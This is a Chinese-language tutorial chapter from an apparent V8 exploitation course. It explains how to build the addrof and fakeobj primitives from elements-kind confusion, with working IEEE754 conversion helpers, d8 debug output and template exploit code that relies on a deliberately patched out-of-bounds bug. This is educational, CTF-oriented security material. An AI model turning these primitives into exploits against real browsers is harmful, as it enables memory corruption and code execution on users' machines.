# Ch 15 — 建立 addrof / fakeobj

> **目標**：打造 V8 利用的**兩把萬能鑰匙**——`addrof(obj)`（洩漏任意 JS 物件的位址）與 `fakeobj(addr)`（把攻擊者控制的位址當成 JS 物件）。這一章是全課引用最密的核心：後面每一條 exploit 鏈都從這兩個原語起手。我們用 [Ch 7](./07-jsarray-elements-kind.md) 鋪好的 **elements kind confusion**（double 陣列存原始位元 vs object 陣列存指標）把它們建構出來，並附上一組**能在真 d8 驗證**的 IEEE754 位元互轉工具（addrof/fakeobj 的黏著劑）。

> **環境**：V8 15.3.0（candidate）、git commit `ab2cad06`，`~/v8build/v8/out/x64.release/d8`（sandbox on）。**IEEE754 互轉、`%DebugPrint` 看指標、double/object 陣列佈局全部真跑**；**完整 confusion → addrof/fakeobj 需要 [Ch 14](./14-first-oob.md) 的 challenge patch OOB**，該部分標「理論預期」並給重編步驟，不捏造成功輸出。

## 為什麼需要這個？

你在 [Ch 14](./14-first-oob.md) 拿到一個 OOB，也知道越界能摸到相鄰 metadata。但 OOB 本身是「相對」的——你只能讀寫「我的 backing store 附近」。要打穿整個進程，你需要**絕對能力**：

1. **知道某個物件在記憶體的哪裡**（否則你連要攻誰都不知道）——這是 `addrof`。
2. **在任意位址憑空造出一個 V8 會當真的物件**（這樣你才能偽造一個 map、一個 elements 指標、一個 data_ptr）——這是 `fakeobj`。

有了這兩把鑰匙，任意讀寫就是水到渠成（[Ch 16](./16-fake-object-rw.md)、[Ch 17](./17-typedarray-attack.md)）。**幾乎每一份 V8 exploit 的第一段程式碼，就是定義 `addrof` 和 `fakeobj`。** 它們是這個領域的 `read()`/`write()`——最基礎、最通用、最該背在骨子裡的抽象。

而它們的建構，全部建立在 [Ch 7](./07-jsarray-elements-kind.md) 那句話上：**double 陣列攤平存原始 8-byte 位元、object 陣列存 V8 會解引用的 tagged 指標，兩塊記憶體佈局幾乎一樣，差別只在 Map 說它是哪種。** 把這個差別「騙」過來，兩把鑰匙就成形。

## 先建立直覺：同一塊記憶體，兩種讀法

想像一排 8-byte 的格子，裡面躺著一串位元。V8 怎麼「理解」這些位元，**完全取決於它以為這是什麼陣列**：

```
   同一塊 backing store 的位元：  [ 0x0000_5820_104b_3bd1 ]
                                        │
        ┌───────────────────────────────┴───────────────────────────────┐
        ▼                                                                ▼
   V8 以為這是 DOUBLE 陣列                        V8 以為這是 OBJECT 陣列
   → 把這 8 bytes 當「一個 double 數字」            → 把這 8 bytes 當「一個 tagged 指標」
     給你：itof(0x5820104b3bd1)                     → 跑去 0x5820104b3bd0 解引用當物件
     = 某個浮點數（= 物件位址！）                     → 你憑空造出一個「物件」
        │                                                                │
        └────────► 這就是 addrof            這就是 fakeobj ◄─────────────┘
```

- **`addrof`**：把 `obj` 放進一個 **object 陣列**（那格現在存的是 `obj` 的指標），然後**騙 V8 以為這是 double 陣列**去讀那格——V8 把 `obj` 的指標位元當成一個 double 數字交給你。你用 IEEE754 反轉，就得到 `obj` 的裸位址。
- **`fakeobj`**：把一個位址 `addr` 寫進一個 **double 陣列**（那 8 bytes 就是你的 `addr` 位元），然後**騙 V8 以為這是 object 陣列**去讀那格——V8 把你的 `addr` 當成物件指標解引用，你憑空「造」出一個物件。

**兩者是互為逆操作**：addrof 把「物件 → 位址」（指標當數字讀），fakeobj 把「位址 → 物件」（數字當指標用）。confusion 是同一個，只是用的方向相反。

## 底層機制一：IEEE754 位元互轉（可真跑驗證）

addrof 讀出來的是一個 double，你要把它變回整數位址；fakeobj 要把一個整數位址變成 double 塞進 double 陣列。這需要 **double ↔ uint64 的位元級互轉**。V8 給了現成工具：`Float64Array` 和 `BigUint64Array` **共享同一個 ArrayBuffer**，寫一邊、讀另一邊，就是位元 reinterpret（[Ch 8](./08-arraybuffer-typedarray.md) 的多 view 共享 buffer）。

這段**可以在乾淨 d8 上真跑**（不需要任何 patch），是本章唯一完全可驗證的核心工具：

```js
// exploit template 的第一段，全課共用
let _buf = new ArrayBuffer(8);
let _f64 = new Float64Array(_buf);
let _u64 = new BigUint64Array(_buf);

// double → uint64 位元（addrof 用：把讀出的 double 變回位址）
function ftoi(f) { _f64[0] = f; return _u64[0]; }

// uint64 → double 位元（fakeobj 用：把位址變成 double 塞進 double 陣列）
function itof(i) { _u64[0] = i; return _f64[0]; }
```

真跑驗證（`~/v8build/v8/out/x64.release/d8`）：

```
$ d8 --allow-natives-syntax bpwnP3_ieee.js
ftoi(1.5) = 0x3ff8000000000000
itof(0x401199999999999a) = 4.4
roundtrip: deadbeefcafebabe
itof(0x12345678) = 1.50897478e-315
```

逐行讀：

- **`ftoi(1.5) = 0x3ff8000000000000`**：`1.5` 的 IEEE754 位元，和 [Ch 3](./03-value-representation.md)/[Ch 7](./07-jsarray-elements-kind.md) 對得上。
- **`itof(0x401199999999999a) = 4.4`**：反過來，那串位元就是 `4.4`（也和 Ch 7 dump 的 `4.4 (0x401199999999999a)` 一致）。
- **`roundtrip: deadbeefcafebabe`**：`ftoi(itof(0xdeadbeefcafebabe))` 完整往返、無損。**這證明 double 是任意 64-bit 位元的無損容器**——這正是為什麼 double 陣列能攜帶指標。
- **`itof(0x12345678) = 1.50897478e-315`**：一個「像位址」的小整數，被當 double 讀出來是個 denormal 浮點。你 addrof 讀出來的通常就是這種「醜浮點」，用 `ftoi` 轉回位址才有意義。

> **踩雷（NaN-boxing 陷阱）**：某些引擎（如 JSC）對 double 用 NaN-boxing，某些位元模式無法無損穿過。**V8 不 NaN-box double 陣列的元素**（FixedDoubleArray 存原始位元），所以上面的 roundtrip 是乾淨的。但別把這假設套到別的引擎。另外，如果位址剛好是某些 NaN 位元模式，V8 的 double 正規化在**特定路徑**可能把 signaling NaN 轉成 quiet NaN——實務上位址很少撞到，遇到再說（見進階）。

## 底層機制二：addrof 讀到的位址長怎樣（可真跑）

先不用 confusion，直接用 `%DebugPrint` 看「一個物件放進陣列後，那格存的指標」，確認 addrof 的目標值是什麼。這段**在乾淨 d8 真跑**：

```
$ d8 --allow-natives-syntax -e '
  let victim = {marker: 0x1337};
  let arr = [victim];
  %DebugPrint(arr);
  %DebugPrint(victim);'
```

真跑（節錄）：

```
DebugPrint: 0x5820104b3f1: [JSArray]
 - map: 0x05820100d051 <Map[16](PACKED_ELEMENTS)>
 - elements: 0x05820104b3e5 <FixedArray[1]> {
           0: 0x05820104b3bd <Object map = 0x5820101e46d>   ← arr[0] 存的指標
 }
...
DebugPrint: 0x5820104b3bd: [JS_OBJECT_TYPE]                  ← victim 本體位址
 - map: 0x05820101e46d <Map[16](HOLEY_ELEMENTS)>
 - properties: ...
    #marker: 4919 (const data field 3, in-obj)
```

**看清楚這個對應**：`arr` 是 `PACKED_ELEMENTS`（object 陣列），它的 `elements[0]` 存的是 `0x05820104b3bd`——**正是 `victim` 本體的位址**。所以：

> `addrof(victim)` 想做的事，就是「把 `arr[0]` 這格（存著 `0x..b3bd`）當成一個 double 讀出來」。confusion 讓 V8 以為 `arr` 是 double 陣列，`arr[0]` 就回傳 `itof` 過的 `0x..b3bd`；你再 `ftoi` 一下，拿到 `0x5820104b3bd`——`victim` 的位址到手。

注意這個位址是 **cage 內壓縮 tagged 位址**（[Ch 4](./04-pointer-compression.md)）：低位是壓縮 offset、最低位 bit 是 tag（`1`=HeapObject，`0x..3bd` 的 `d`=`1101` 尾巴帶 tag）。addrof 給你的就是這個 tagged 壓縮位址，正合後面計算用。

## 建構 addrof / fakeobj：兩條主流路徑

confusion 怎麼製造？兩條主流。你在 CTF 拿到的原語決定你走哪條。

### 路徑 A：直接改 elements kind（用 OOB 蓋 map）

如果你的 OOB（[Ch 14](./14-first-oob.md)）能改到相鄰陣列的 **map 指標**，最直接：把一個 double 陣列的 map 換成 object 陣列的 map（或反之）。同一塊 backing store，換個 map，讀法就翻轉。

```
   [ double 陣列 A ]  map = PACKED_DOUBLE_ELEMENTS 的 map
        │ 用 OOB 把 A 的 map 蓋成 PACKED_ELEMENTS 的 map
        ▼
   [ 同一塊 A ]      map = PACKED_ELEMENTS  → 現在 V8 把 A[i] 當指標解引用
```

**怎麼拿到「object 陣列的 map」**：先 `let dbl=[1.1]; let obj=[{}];`，用 addrof（或 OOB 讀）洩漏 `obj` 的 map，記下來，需要時 OOB 寫回 `dbl` 的 map 欄位。這條路乾淨但要求「OOB 能精準改 map」。

### 路徑 B：兩個陣列共用一塊 elements（經典 saelo 手法）

更經典、更不依賴精準 OOB 的做法：**讓一個 double 陣列和一個 object 陣列指向同一塊 elements backing store**。這樣寫 object 陣列、讀 double 陣列（或反之）就是天然的 confusion，連 OOB 都可省（若你有別的方法達成共用）。

用 OOB 達成共用的做法：OOB 改一個陣列的 `elements` 指標欄位，讓它指向另一個陣列的 elements。或者利用某些 confusion bug 直接產生兩個 view。saelo 的原始手法是用型別混淆讓 `double_arr` 和 `obj_arr` 別名（alias）。

### 兩把鑰匙的最終形（exploit template）

不管走 A 還是 B，寫出來的 `addrof`/`fakeobj` 介面長這樣（**這是全課共用的 template，之後各章直接引用**）：

```js
// 假設 confusion 已建立：
//   dbl_arr 是 double 陣列、obj_arr 是 object 陣列，
//   兩者「別名」到同一塊 elements（寫 obj_arr[k]、讀 dbl_arr[k] 讀到指標位元）

function addrof(obj) {
  obj_arr[0] = obj;            // obj 的指標寫進共用 backing store
  return ftoi(dbl_arr[0]);     // 用 double 陣列讀同一格 → 拿到指標位元 → 轉回位址
}

function fakeobj(addr) {
  dbl_arr[0] = itof(addr);     // 把 addr 位元寫進共用 backing store
  return obj_arr[0];           // 用 object 陣列讀同一格 → V8 把 addr 當物件指標
}
```

**四行程式碼，整個 V8 利用領域的地基。** 讀懂這四行，你就懂了為什麼 elements kind confusion 是「最經典入門原語」——它一次給你兩把鑰匙，而且互為逆。

## 用 challenge patch 真的跑（理論預期）

> **未實測，理論預期（需 [Ch 14](./14-first-oob.md) 的 challenge patch OOB 並重編 V8）**。可驗證的中間步驟（IEEE754 互轉、指標值長相）已在上面真跑。完整 confusion 觸發需要 patch build，這裡給出**預期**的觸發碼與行為，不捏造成功輸出。

用 [Ch 14](./14-first-oob.md) 的 `Array.prototype.oob`（不檢查邊界的 double 越界讀寫）建構路徑 A：

```js
// --- IEEE754 工具（真跑可驗證，見上）---
let _buf = new ArrayBuffer(8), _f64 = new Float64Array(_buf), _u64 = new BigUint64Array(_buf);
function ftoi(f){_f64[0]=f;return _u64[0];}
function itof(i){_u64[0]=i;return _f64[0];}

// --- 準備兩個相鄰陣列 ---
let dbl = [1.1, 2.2, 3.3, 4.4];   // OOB 載體（double）
let obj = [{}, {}];               // 受害者（object 陣列，緊鄰在後）

// 1) 用 OOB 掃出 obj 的 map 欄位在第幾格（見 Ch 14 練習）
//    預期：某個 i，dbl.oob(i) 的低 32 bit 長得像壓縮 map 指標
// 2) 洩漏 obj 的 map（先記下 PACKED_ELEMENTS 的 map 壓縮值）
//    let obj_map = ftoi(dbl.oob(idx_of_obj_map)) & 0xffffffffn;
// 3) 洩漏 dbl 自己的 map（PACKED_DOUBLE_ELEMENTS）同理

// addrof：把 dbl 的 map 蓋成 obj 的 map，讀出指標，再蓋回去
function addrof(o) {
  obj[0] = o;                              // o 的指標進 obj.elements[0]
  dbl.oob(idx_of_obj_map, itof(dbl_map));  // 把 obj 的 map 換成 double map
  let leak = ftoi(obj[0]);                 // 現在 obj 被當 double 陣列，obj[0] 是指標位元
  dbl.oob(idx_of_obj_map, itof(obj_map));  // 復原，避免 V8 崩
  return leak;
}
```

（實務更常用「別名共用 elements」的路徑 B，程式碼就是上面 template 那四行；此處示範路徑 A 是為了讓你看見 map 改寫怎麼直接對應到 confusion。）

**預期行為**：`addrof({})` 回傳一個像 `0x5820104bXXX` 的 tagged 壓縮位址（每跑不同）；拿它和 `%DebugPrint` 印的物件位址對照應該一致。`fakeobj(某個你控制的 double 陣列位址)` 回傳一個「物件」，`%DebugPrint(fakeobj(...))` 會用你偽造的 map 去解讀（[Ch 16](./16-fake-object-rw.md) 詳解怎麼擺這塊記憶體）。

**重編**：套 [Ch 14](./14-first-oob.md) 的 patch 後 `autoninja -C out/x64.release d8`，把上面存成 `.js` 跑。位址每次不同，教你認結構、不背位址。

## addrof / fakeobj 對照

| 面向 | `addrof(obj)` | `fakeobj(addr)` |
|---|---|---|
| 方向 | 物件 → 位址 | 位址 → 物件 |
| 寫哪裡 | `obj` 寫進 **object 陣列** | `addr` 寫進 **double 陣列** |
| 讀哪裡 | 用 **double 陣列**讀（指標當位元） | 用 **object 陣列**讀（位元當指標） |
| 黏著劑 | `ftoi`（double → uint64） | `itof`（uint64 → double） |
| 危險性 | 較安全（只是讀出數字） | **危險**：V8 立刻解引用 addr，addr 亂寫會崩 |
| 主要用途 | 洩漏 map、洩漏目標物件位址 | 偽造 array/TypedArray（[Ch 16](./16-fake-object-rw.md)/[Ch 17](./17-typedarray-attack.md)） |

**關鍵不對稱**：`addrof` 溫和，`fakeobj` 兇險。fakeobj 一回傳，你手上的「假物件」的 map、length 等欄位都會被 V8 當真——只要你偽造的記憶體佈局稍有不對，下一次觸碰它 V8 就崩。所以 fakeobj 幾乎總是搭配「你先在一個 double 陣列裡精心排好一個假物件的位元、再 fakeobj 指過去」（[Ch 16](./16-fake-object-rw.md) 的全部功夫）。

## 踩雷集錦

1. **錯誤直覺：「addrof 讀出來的就是可以直接算的裸位址」。正確**：讀出的是 **cage 內壓縮 tagged 位址**（[Ch 4](./04-pointer-compression.md)）——帶 tag（最低位）、且是壓縮 offset。要算真實 64-bit 位址得 `| cage_base`；很多時候你**不需要**解壓，直接在壓縮世界裡算 offset 更省事。搞混壓縮/非壓縮，offset 全錯。
2. **錯誤直覺：「fakeobj 給任意位址都安全」。正確**：`fakeobj` 一回傳，V8 就把該位址當物件、隨時解引用它的 map。指到亂記憶體 = 立刻崩。fakeobj 的位址**必須指向你已經排好合法 map/欄位的記憶體**（通常是你自己 double 陣列的某格）。
3. **錯誤直覺：「IEEE754 互轉可有可無，反正都是數字」。正確**：addrof 讀出的是 double，你**必須 `ftoi`** 才拿到整數位址；fakeobj 要寫的位址是整數，你**必須 `itof`** 才能塞進 double 陣列。少了這層，你在拿浮點數當位址算，全錯。
4. **錯誤直覺：「V8 也會 NaN-box，某些位址穿不過去」。正確**：V8 的 **FixedDoubleArray 存原始位元、不 NaN-box**（實測 roundtrip 無損），所以位址能乾淨穿過。這點和 JSC 不同，別套錯引擎的假設。
5. **錯誤直覺：「confusion 建好就一直用，不用復原」。正確**：路徑 A（改 map）用完**要把 map 蓋回去**，否則那個陣列型別是壞的，GC 或後續操作一碰就崩。addrof 裡「改 map → 讀 → 蓋回」是標準三步。

## 進階：再往深一層

- **SMI vs HeapObject tag 的干擾**：addrof 你想要的是 HeapObject 的 tagged 位址。如果你不小心把一個 SMI（最低位 0）當 addrof 目標，讀出來的位元不是指標。確認目標是個 heap 物件（`{}`、陣列、函式），不是純數字。
- **NaN 正規化的極端情況**：V8 在某些把 double 存進 FixedDoubleArray 的路徑會做 NaN canonicalization（把 signaling NaN 變 quiet）。位址極少撞到 NaN 位元模式（需要指數全 1），但若你的 fakeobj 位址剛好是這種，`itof`→store→load 回來可能被改。實務上遇到再處理，方法是避開那格或用不觸發正規化的路徑（如直接 OOB 寫）。
- **別名（aliasing）比改 map 更穩**：路徑 B（兩陣列共用 elements）不需要每次 addrof 都改 map/復原，因此更穩、更快、更不易崩。CTF 老手多半用它。達成別名的方法很多（OOB 改 elements 指標、fakeobj 造出別名 view、特定 confusion bug 天生別名）。
- **從 addrof/fakeobj 到穩定 R/W 的兩條路**：拿到這兩把鑰匙後，[Ch 16](./16-fake-object-rw.md) 走「fakeobj 一個假 FixedDoubleArray、控制其 elements 指標」；[Ch 17](./17-typedarray-attack.md) 走「fakeobj/破壞一個 TypedArray、控制其 data_ptr」。後者更乾淨、是現代主流。
- **原始碼**：`src/objects/elements-kind.h`（六種 kind 的 enum，改 map 時要對應的 map）、`src/objects/fixed-array.h`（FixedDoubleArray 佈局）、`src/objects/js-array-buffer.h`（fakeobj 假 TypedArray 要模仿的欄位）。

## 動手練習

1. **真跑 IEEE754 工具**：把本章的 `ftoi`/`itof` 存成 `.js`，在乾淨 d8 跑。驗證 `ftoi(itof(x))===x` 對幾個「像位址」的值（`0x5820104b3bd`、`0xdeadbeef`、`0x7fff_ffff_ffff` 等）成立。刻意找一個 NaN 位元模式（如 `0x7ff8000000000000`）試 roundtrip，觀察會不會被正規化——體會進階提到的陷阱。
2. **手動模擬 addrof**：在乾淨 d8 用 `%DebugPrint` 把一個物件放進 object 陣列，記下 `elements[0]` 的指標值和物件本體位址，確認相等。再手算「如果我能把這格當 double 讀，`ftoi` 回來會是什麼」——你就手動走了一遍 addrof 的邏輯，只差 confusion。
3. **套 patch 做完整 addrof/fakeobj**（需 [Ch 14](./14-first-oob.md) patch 重編）：實作本章的路徑 A `addrof`，讓它回傳一個位址；`%DebugPrint` 對照驗證正確。接著實作 `fakeobj`：先在一個 double 陣列裡排一個「假物件的 map」，fakeobj 指過去，`%DebugPrint` 看 V8 是否照你的假 map 解讀。這是練習 B 的核心。

## 本章重點整理

- **`addrof`/`fakeobj` 是 V8 利用的兩把萬能鑰匙、互為逆操作**：addrof 把物件當數字讀出位址、fakeobj 把數字當指標造出物件。全課每條 exploit 都從這兩行起手。
- 建構原理是 **elements kind confusion**（[Ch 7](./07-jsarray-elements-kind.md)）：double 陣列存原始位元、object 陣列存會被解引用的指標，同一塊記憶體換個 map 就翻轉讀法。
- **IEEE754 互轉（`ftoi`/`itof`）是黏著劑且可真跑驗證**：double 是無損 64-bit 容器（V8 不 NaN-box FixedDoubleArray），addrof 讀出的 double 要 `ftoi`、fakeobj 要寫的位址要 `itof`。
- 兩條建構路徑：**A 改 map（用完要復原）**、**B 兩陣列別名共用 elements（更穩、CTF 主流）**。最終 template 就是四行 `addrof`/`fakeobj`。
- **不對稱**：addrof 溫和、fakeobj 兇險——fakeobj 一回傳 V8 立刻解引用，位址必須指向你排好合法欄位的記憶體（[Ch 16](./16-fake-object-rw.md)）。addrof 讀出的是壓縮 tagged 位址，別當裸位址算。

## 自我檢核

- [ ] 能默寫四行 `addrof`/`fakeobj` template，並解釋每行為什麼用 double 陣列還是 object 陣列讀/寫
- [ ] 能說出 `ftoi`/`itof` 各在 addrof/fakeobj 的哪一步、為什麼少了就全錯
- [ ] 能解釋為什麼 V8 的 double 陣列能無損攜帶指標（不 NaN-box），並知道這和 JSC 的差別
- [ ] 能說出 addrof 讀出的是「壓縮 tagged 位址」、以及 fakeobj 為什麼兇險
- [ ] 能比較路徑 A（改 map+復原）與路徑 B（別名）的穩定性差異
- [ ] （面試題）「請從 elements kind confusion 推導出 addrof 和 fakeobj，並說明它們為什麼互為逆操作」能完整答出

## 延伸閱讀

- **[saelo “Attacking JavaScript Engines” — Phrack 0x46 (§ addrof/fakeobj)](http://www.phrack.org/issues/70/3.html)**
  - **這篇說什麼**：addrof/fakeobj 的**奠基性建構**——如何從陣列型別混淆造出這兩個原語（JSC 為例，觀念與 V8 完全相通）。本章 template 的思想源頭。
  - **讀哪裡**：addrof/fakeobj 建構與「別名兩陣列」那節。
  - **關聯**：本章路徑 B 的原始出處；把「同一塊記憶體兩種讀法」講到骨子裡。
- **[doar-e / Jeremy Fetiveau “Circumventing Chrome’s hardening of typer bugs” 系列](https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/)**
  - **這篇說什麼**：真實 V8 exploit 裡 addrof/fakeobj 怎麼從 typer bug 落地、以及 V8 對這類原語的加固與繞法。
  - **讀哪裡**：primitive 建構段落，對照本章路徑 A/B。
  - **關聯**：把本章的乾淨 template 接到真實 bug 與現代加固，通往 Part 4。
- **[V8 `src/objects/elements-kind.h` 與 `fixed-array.h` 原始碼](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/elements-kind.h)**
  - **這篇說什麼**：六種 elements kind 的 enum 與 FixedDoubleArray/FixedArray 佈局——你改 map 時要用哪個常數、confusion 兩端各對應哪塊。
  - **讀哪裡**：`ElementsKind` enum、`FixedDoubleArray` 定義。
  - **關聯**：本章 confusion 的權威定義，綁死 commit `ab2cad06`。

兩把鑰匙到手，但它們還只是「洩漏位址」和「造出一個殼」。真正的目標是**任意讀寫**。下一章把 addrof/fakeobj 組裝成第一個穩定的任意讀寫原語：偽造一個 FixedDoubleArray、控制它的 elements 指標。

→ [Ch 16 — 從 addrof/fakeobj 到任意讀寫](./16-fake-object-rw.md)
